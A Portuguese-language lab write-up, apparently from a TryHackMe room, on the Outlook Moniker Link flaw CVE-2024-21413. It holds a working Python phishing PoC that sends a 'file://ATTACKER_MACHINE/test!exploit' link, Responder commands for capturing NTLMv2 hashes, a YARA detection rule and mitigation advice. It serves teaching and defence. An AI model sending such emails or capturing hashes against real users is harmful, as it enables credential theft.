<!-- ===================================== -->
<!--      MONIKER LINK - CVE-2024-21413   -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Vulnerability-CVE--2024--21413-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Product-Microsoft%20Outlook-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Attack%20Type-Credential%20Leak-black?style=flat-square">
  <img src="https://img.shields.io/badge/Vector-Moniker%20Link%20Abuse-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Impact-NTLM%20Hash%20Capture-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Domain-Email%20Security-informational?style=flat-square">
</p>

---

# 📧 Moniker Link Vulnerability (CVE-2024-21413)
## Exploração de Vazamento de Credenciais NTLM via Microsoft Outlook

> Este documento apresenta uma análise técnica detalhada da vulnerabilidade  
> **CVE-2024-21413**, conhecida como **Moniker Link**, que afeta o **Microsoft Outlook**.
>
> A falha permite que um atacante **contorne os mecanismos de proteção do Outlook** ao manipular um tipo específico de hyperlink chamado **Moniker Link**, levando o cliente de e-mail a realizar **autenticação SMB automática** contra um servidor controlado pelo atacante.
>
> Como consequência, o sistema da vítima pode enviar **hashes NetNTLMv2**, permitindo:
>
> - 🔐 Captura de credenciais NTLM
> - 🧩 Comprometimento potencial de contas corporativas
>
> A exploração pode ser realizada através de **um simples e-mail contendo um link HTML malicioso**, exigindo **interação mínima da vítima**.

---

## 🧰 Ferramentas Utilizadas

Durante a exploração e análise deste cenário são utilizadas ferramentas amplamente empregadas em **Pentest e Red Team**:

- **Responder** — Captura de hashes NTLMv2
- **Python (SMTP Script)** — Envio de e-mail malicioso
- **Wireshark** — Análise de tráfego SMB

---

⚠️ Este material possui fins **exclusivamente educacionais e de pesquisa em segurança**.  
Todos os testes foram realizados em **ambiente controlado e autorizado**.

---
# Moniker Link (CVE-2024-21413)

## 1. Introdução

Em **13 de fevereiro de 2024**, a Microsoft divulgou uma vulnerabilidade crítica no Microsoft Outlook, identificada como **[CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413)** e apelidada de **"Moniker Link"**. A descoberta é creditada a **[Haifei Li, da Check Point Research](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/)**.

Esta vulnerabilidade permite que um atacante **ignore os mecanismos de segurança do Outlook** ao manipular um tipo específico de hiperlink conhecido como **Moniker Link**. Ao enviar um e-mail contendo um link malicioso, o atacante pode fazer com que o Outlook da vítima envie **credenciais NTLM** para o servidor do atacante **sem qualquer interação além do clique no link**.

### 1.2. Pontuação e Impacto

|**Métrica**|**Detalhe**|
|---|---|
|**Data de Publicação**|13 de fevereiro de 2024|
|**Artigo Microsoft**|[msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)|
|**Impacto**|Execução Remota de Código (RCE) & Vazamento de Credenciais|
|**Severidade**|🔴 **Crítico**|
|**Complexidade de Ataque**|Baixa|
|**Pontuação CVSS 3.1**|**9.8** (Crítico)|

### 1.3. Versões Afetadas

|**Produto**|**Versões Afetadas**|
|---|---|
|Microsoft Office LTSC 2021|Afetado a partir de 19.0.0|
|Microsoft 365 Apps for Enterprise|Afetado a partir de 16.0.1|
|Microsoft Office 2019|Afetado a partir de 16.0.1|
|Microsoft Office 2016|Afetado a partir da versão 16.0.0 anterior à 16.0.5435.1001|

---
## 2. Compreendendo o Moniker Link

### 2.1. O Mecanismo por Trás do Ataque

O Microsoft Outlook é capaz de renderizar e-mails em HTML, interpretando hiperlinks comuns como HTTP e HTTPS. No entanto, o Outlook também suporta **URLs que especificam aplicativos**, conhecidos como **[Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers)**. Estes links utilizam o protocolo `file://` para acessar recursos locais ou remotos.

### 2.2. Modo de Exibição Protegida

O Outlook implementa um recurso de segurança chamado **"Modo de Exibição Protegida"**, que abre e-mails de fontes externas em um ambiente restrito, bloqueando tentativas de acessar recursos externos via SMB.

![](https://research.checkpoint.com/wp-content/uploads/2024/02/HBNP4GTD5Y-image1.png)

Quando um link tenta acessar um arquivo via `file://`, o Modo de Exibição Protegida bloqueia a tentativa:

```html
<!-- Este link seria bloqueado pelo Modo de Exibição Protegida -->
<p><a href="file://ATTACKER_MACHINE/test">Clique aqui</a></p>
```

### 2.3. A Falha: O Caractere `!`

A vulnerabilidade reside na possibilidade de **modificar o hiperlink para incluir o caractere especial `!`** seguido de texto arbitrário. Esta modificação faz com que o Outlook **ignore o Modo de Exibição Protegida**, processando o link mesmo em ambiente restrito.

```html
<!-- Este link burla o Modo de Exibição Protegida -->
<p><a href="file://ATTACKER_MACHINE/test!exploit">Clique aqui</a></p>
```

Quando a vítima clica no link, o Outlook tenta acessar o recurso especificado via protocolo SMB, resultando em:

1. Uma tentativa de autenticação contra o servidor do atacante
2. O envio do **hash NetNTLMv2** da vítima
3. Potencialmente, a execução remota de código

### 2.4. Potencial para RCE

A Execução Remota de Código (RCE) é possível porque os Moniker Links utilizam o **Component Object Model (COM)** do Windows. No entanto, até o momento, **não há prova de conceito pública** demonstrando RCE específica para esta CVE.

---
## 3. Exploração Prática

### 3.1. Prova de Conceito (PoC)

O script abaixo (disponível no [GitHub](https://github.com/CMNatic/CVE-2024-21413)) demonstra o envio de um e-mail malicioso contendo o Moniker Link vulnerável:

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

A prova de conceito (PoC):

- Recebe um e-mail do atacante e um da vítima. Normalmente, você precisaria usar seu próprio servidor SMTP (este já foi fornecido nesta sala).
- Requer a senha para autenticação. Para esta sala, a senha para `attacker@monikerlink.thm` é `attacker`.
- Contém o conteúdo do e-mail (html_content), que contém nosso Moniker Link como um hiperlink HTML.
- Em seguida, preenche os campos "assunto", "de" e "para" no e-mail.
- Finalmente, envia o e-mail para o servidor de e-mail.

### 3.2. Configuração do Ambiente

**Na máquina atacante (AttackBox):**

1. Crie o arquivo `exploit.py` com o conteúdo acima
2. Substitua `ATTACKER_MACHINE` pelo IP da sua máquina atacante
3. Substitua `MAILSERVER` por `10.64.141.80` (IP da máquina da vítima)

### 3.3. Preparação do Listener (Responder)

O **Responder** é utilizado para capturar hashes NTLMv2:

```bash
sudo responder -I tun0
```

**Explicação:**

- `sudo`: Privilégios de root necessários
- `-I tun0`: Interface de rede (tun0 para VPN TryHackMe)

**Saída esperada:**

```text
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

-- cut for brevity --

[+] Listening for events...
```

### 3.4. Execução do Ataque

**Na máquina atacante:**

```bash
python3 exploit.py
Enter your attacker email password: attacker
```

**Saída esperada:**

```text
Email delivered
```

**Na máquina vítima:**

1. Abra o Outlook pelo atalho na área de trabalho
2. Clique em "Não quero entrar nem criar uma conta"

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/3f6b7f84e25513a4cc01ec7823f28f08.png)

3. Feche a janela pop-up clicando no "X"

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/221bf555475b6a2debb02d8880922173.png)

4. Verifique a caixa de entrada:

![](https://assets.tryhackme.com/additional/CVE-2024-21410/outlook4.png)

5. Clique no hiperlink "Clique aqui" e retorne à nossa sessão de terminal "Responder" no AttackBox:

### 3.5. Captura do Hash NTLMv2

No terminal do Responder, o hash NTLMv2 da vítima é capturado:

![](https://assets.tryhackme.com/additional/CVE-2024-21410/responder.png)

Este hash pode ser posteriormente quebrado com ferramentas como **John the Ripper** ou **Hashcat** para obter a senha em texto claro.

---
## 4. Detecção

### 4.1. Regras YARA

**[Florian Roth](https://twitter.com/cyb3rops/status/1758792873254744344)** desenvolveu uma [regra YARA](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar) para detectar e-mails contendo o padrão `file:\\` com o caractere `!`:

```yar
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
   meta:
      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
      author = "X__Junior, Florian Roth"
      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
      date = "2024-02-17"
      modified = "2024-02-19"
      score = 75
      id = "4512ca7b-0755-565e-84f1-596552949aa5"
   strings:
      $a1 = "Subject: "
      $a2 = "Received: "

      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/
   condition:
      filesize < 1000KB
      and all of ($a*)
      and 1 of ($xr*)
}
```

### 4.2. Análise em Wireshark

A tentativa de conexão SMB da vítima para o atacante pode ser observada em capturas de rede, revelando o hash NetNTLMv2:

![](https://assets.tryhackme.com/additional/CVE-2024-21410/wireshark.png)

---
## 5. Mitigação

### 5.1. Patches e Atualizações

A Microsoft incluiu correções para esta vulnerabilidade na atualização de segurança de fevereiro de 2024 (**Patch Tuesday**). As correções específicas por versão do Office estão disponíveis no **[Catálogo do Microsoft Update](https://www.catalog.update.microsoft.com/Home.aspx)**.

**Ação recomendada:** Aplicar imediatamente as atualizações de segurança do Office via Windows Update ou download manual.

### 5.2. Boas Práticas para Usuários

|**Prática**|**Descrição**|
|---|---|
|**Desconfie de links**|Não clique em links de e-mails não solicitados|
|**Verifique antes de clicar**|Passe o mouse sobre links para visualizar o destino real|
|**Reporte suspeitas**|Encaminhe e-mails suspeitos para a equipe de segurança|

### 5.3. Considerações sobre Bloqueio de SMB

Como a vulnerabilidade ignora o Modo de Exibição Protegida, **não há configuração no Outlook** que previna este ataque. O bloqueio completo do protocolo SMB no firewall pode ser considerado, mas deve ser avaliado cuidadosamente, pois:

- SMB é essencial para compartilhamentos de rede legítimos
    
- O bloqueio pode impactar operações de negócio
    
- Uma abordagem mais granular (permitir SMB apenas para servidores confiáveis) pode ser mais adequada
    

---
## 6. Conclusão

O **CVE-2024-21413 (Moniker Link)** representa uma ameaça significativa para organizações que utilizam Microsoft Outlook. Com pontuação **CVSS 9.8** e complexidade de ataque baixa, a vulnerabilidade permite que atacantes:

1. **Contornem o Modo de Exibição Protegida** do Outlook
2. **Capturem hashes NTLMv2** de usuários
3. **Potencialmente executem código remoto** (RCE)

A exploração é trivial: um único clique em um link malicioso é suficiente para comprometer credenciais. A detecção pode ser realizada através de:

- **Regras YARA** em gateways de e-mail
- **Análise de tráfego de rede** com Wireshark
- **Monitoramento de tentativas de conexão SMB** não autorizadas

A mitigação eficaz requer:

- **Aplicação imediata de patches** da Microsoft
- **Conscientização de usuários** sobre riscos de phishing
- **Avaliação do bloqueio de SMB** em firewalls

A vulnerabilidade serve como um lembrete crítico da importância de manter sistemas atualizados e de implementar defesas em camadas, mesmo para aplicações aparentemente seguras como clientes de e-mail.

---
## 7. Referências

|**Tipo**|**Descrição**|**Link**|
|---|---|---|
|**CVE**|Registro oficial da vulnerabilidade|[cve.org/CVERecord?id=CVE-2024-21413](https://www.cve.org/CVERecord?id=CVE-2024-21413)|
|**Microsoft**|Guia de atualização oficial|[msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)|
|**Check Point**|Análise técnica original|[research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug](https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/)|
|**GitHub PoC**|Prova de conceito|[github.com/CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)|
|**YARA Rule**|Regra de detecção|[github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar)|
|**Microsoft Docs**|Documentação sobre Moniker Links|[learn.microsoft.com/en-us/windows/win32/com/url-monikers](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers)|
|**Microsoft Update**|Catálogo de atualizações|[catalog.update.microsoft.com](https://www.catalog.update.microsoft.com/Home.aspx)|
